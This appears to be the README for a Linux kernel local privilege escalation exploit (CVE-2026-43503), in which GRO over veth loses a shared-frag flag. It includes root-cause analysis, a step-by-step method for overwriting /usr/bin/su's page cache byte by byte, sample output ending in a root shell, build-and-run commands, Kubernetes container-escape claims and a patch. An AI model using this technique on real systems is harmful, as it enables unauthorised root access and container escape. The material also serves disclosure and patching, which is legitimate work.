# GRO Flag Loss (CVE-2026-43503) — Local Privilege Escalation via skb_gro_receive

A page-cache corruption vulnerability in the Linux kernel's Generic Receive Offload (GRO) path that achieves controlled byte-at-a-time writes to arbitrary readable files, producing a root shell in ~10 seconds.

**CVE:** CVE-2026-43503
**Bypasses:** CVE-2026-43284 (Dirty Frag) and CVE-2026-46300 (Fragnesia) patches.
**Attack surface:** veth + GRO = **default Kubernetes container networking path.**
**Attack surface:** veth + GRO = **default Kubernetes container networking path.**

---

## Summary

`skb_gro_receive()` merges frags from incoming skbs into an aggregated GRO skb, but never propagates `SKBFL_SHARED_FRAG` from the source skb to the target. When splice'd page-cache pages are coalesced via GRO over a veth pair, the defense flag is silently lost. ESP-in-UDP then decrypts in-place into the unprotected page-cache pages.

---

## Root Cause

**Location:** `net/core/gro.c:92` — function `skb_gro_receive()`

### Vulnerable Code (frag merge path):

```c
frag = pinfo->frags + nr_frags;
frag2 = skbinfo->frags + i;
do {
    *--frag = *--frag2;     // Direct frag copy, NO flag propagation!
} while (--i);
```

### Vulnerable Code (frag_list merge path):

```c
if (NAPI_GRO_CB(p)->last == p)
    skb_shinfo(p)->frag_list = skb;
else
    NAPI_GRO_CB(p)->last->next = skb;
// NO SHARED_FRAG propagation to aggregated skb p
```

### The Chain

1. Sender: `send(MSG_MORE)` writes header (no splice, no flag). Then `splice(target_file)` appends page-cache frags (flag set).
2. Both segments travel over a **veth pair** to a peer namespace with GRO enabled.
3. Both segments arrive in the same NAPI poll cycle → `skb_gro_receive` coalesces them.
4. The `send()` segment becomes the GRO head (no flag). The `splice()` segment's frags are merged in.
5. **Flag is NOT propagated** from the source skb to the aggregated result.
6. GRO flush → aggregated skb enters normal receive path with page-cache frags but NO `SKBFL_SHARED_FRAG`.
7. ESP-in-UDP input: `!skb_cloned(skb)` → true → `skip_cow` → in-place AES-GCM decrypt.
8. Keystream XORs directly into page-cache pages → **corruption**.

---

## What Makes This Exploit Unique

### 1. Default Kubernetes Attack Surface

veth + GRO is the standard networking path for container-to-container communication in Kubernetes (flannel, calico, cilium CNI plugins). Every pod-to-pod TCP connection traverses this code. No special configuration needed in K8s environments.

### 2. MSG_MORE + splice Trick

To trigger GRO coalescing with a flag mismatch:
- `send(MSG_MORE)` creates the first segment (no splice → no SHARED_FRAG)
- `splice(target_file)` creates the second segment (splice → SHARED_FRAG set)
- Both arrive in the same NAPI cycle → GRO merges flagged frags into unflagged head

### 3. ESP-in-UDP (no TCP complexity)

Unlike skb_shift which requires espintcp (TCP ULP), this exploit uses ESP-in-UDP — simpler setup, fewer moving parts. No SACK injection, no TCP connection management per byte.

---

## Exploitation

### Network Topology

```
Parent namespace                    Child namespace
┌──────────────────┐               ┌──────────────────┐
│ veth0 (10.0.0.1) │←── veth ────→│ veth1 (10.0.0.2) │
│                  │    pair       │ GRO enabled      │
│ SENDER           │               │ ESP-in-UDP SA    │
└──────────────────┘               └──────────────────┘
```

### Step-by-Step

#### 1. User Namespace + veth Pair

```c
unshare(CLONE_NEWUSER | CLONE_NEWNET);
// Create child namespace with veth pair
// Enable GRO on child's veth: ethtool -K veth1 gro on
// Disable GSO on child's egress (forces segmentation)
```

#### 2. XFRM SA (ESP-in-UDP in child namespace)

```c
// AES-128-GCM with known key + salt
// UDP encapsulation (encap_type = UDP_ENCAP_ESPINUDP)
// Receiver decrypts incoming ESP-in-UDP packets
```

#### 3. IV Table Precomputation

Same technique as skb_shift: 256-entry table mapping `keystream_byte → IV_nonce`. Computed once, hardcoded in exploit.

#### 4. Per-Byte Write Loop (192 iterations)

For each byte in the 192-byte ELF stub:

```c
// a. Read current byte, compute needed keystream
// b. Look up IV from table
// c. Construct ESP-in-UDP packet:
//    - send(MSG_MORE): ESP header with chosen IV (no splice → no flag)
//    - splice(target_file, offset): page-cache pages (has flag)
// d. Both segments arrive at child's veth1 in same NAPI cycle
// e. GRO coalesces → flag lost on merged skb
// f. ESP-in-UDP input → skip_cow → in-place decrypt
// g. One page-cache byte XOR'd to desired value
```

#### 5. NAPI Coalesce Timing

Both segments must arrive in the same NAPI poll cycle for GRO to merge them. Back-to-back sends over veth are reliable but not fully deterministic. The exploit **retries on failure** — typically succeeds within 1-3 attempts per byte.

#### 6. Escalation

```c
// After 192 bytes: /usr/bin/su page cache = ELF stub
execve("/usr/bin/su", NULL, NULL);
// → setresuid(0,0,0) + setresgid(0,0,0) + execve("/bin/sh")
// → root shell
```

---

## Output

```
[*] GRO Flag Loss LPE
[*] uid=1000 euid=1000
[*] Setting up veth pair + child namespace...
[*] GRO enabled on veth1
[*] ESP-in-UDP SA installed
[*] IV table ready (256 entries)
[*] Writing 192 bytes to /usr/bin/su...
  [ 0] 0x7f→0x7f skip
  ...
  [120] 0x00→0x48 OK (attempt 1)
  [121] 0x00→0x31 OK (attempt 2, retry)
  ...
[*] Write complete: 192/192
[!] /usr/bin/su page cache overwritten!
[!] Executing...
# whoami
root
```

---

## Key Properties

| Property | Value |
|----------|-------|
| Privileges required | None (user namespaces only) |
| File access needed | O_RDONLY on target |
| Write granularity | 1 byte per trigger (via IV table) |
| Reliability | Probabilistic (NAPI coalesce needs retry) |
| Time to root | ~10 seconds |
| Crypto required | Yes (XFRM/ESP AES-128-GCM) |
| Lines of code | ~550 |
| Target | `/usr/bin/su` (first 192 bytes) |
| Escalation | ELF stub → setresuid(0) → execve("/bin/sh") |
| Attack surface | veth + GRO = Kubernetes default networking |

---

## Why veth + GRO Matters

GRO on veth is enabled by default in Kubernetes networking:
- **flannel:** veth pairs between host and pod, GRO on by default
- **calico:** same veth architecture
- **cilium:** uses veth (or eBPF redirect, but veth fallback has GRO)

Any container workload running on a shared-kernel K8s cluster can exploit this to escape to root on the host kernel's page cache. The attacker needs only:
- Code execution inside a container (compromised app, malicious CI job, etc.)
- User namespaces enabled (default on most K8s nodes)

---

## Triggering GRO Coalesce

### Why both segments must arrive in the same NAPI cycle:

GRO aggregates packets received between `napi_poll` invocations. If segments arrive in different polls, they're delivered individually (no merge, no flag loss).

### How we ensure co-arrival:

1. `MSG_MORE` + immediate `splice` sends both back-to-back
2. veth transmit is synchronous (`veth_xmit → veth_forward_skb`) — both arrive at the peer's NAPI queue before the next poll
3. On failure (segments split across polls), retry. Typically succeeds within 1-3 attempts.

### GRO eligibility on veth:

TSO is off by default on veth → all TCP/UDP skbs are GRO-eligible. No ethtool configuration needed beyond `gro on`.

---

## Fix

Propagate `SKBFL_SHARED_FRAG` in both merge paths of `skb_gro_receive`:

```c
// Frag merge path:
skb_shinfo(p)->flags |= skb_shinfo(skb)->flags & SKBFL_SHARED_FRAG;

// Frag_list merge path:
skb_shinfo(p)->flags |= skb_shinfo(skb)->flags & SKBFL_SHARED_FRAG;
```

---

## Build & Run

```bash
gcc -O2 -Wall -static -o exploit exploit.c
./exploit
# → root shell in ~10 seconds
```

## Affected Configurations

- Any Linux kernel with `CONFIG_VETH` + `CONFIG_XFRM` + `CONFIG_INET_ESP` + `CONFIG_USER_NS`
- GRO enabled on veth (default in Kubernetes CNI plugins)
- Kernel versions: v3.9 (2013) through v7.1-rc4 — introduced 13 years ago, fixed in v7.1-rc5 (commit `48f6a5356a33`)
- All major distros: Ubuntu, Fedora, Debian, RHEL 8/9/10, SUSE — all vulnerable in default config
- **Kubernetes clusters with shared-kernel pods** — highest real-world impact
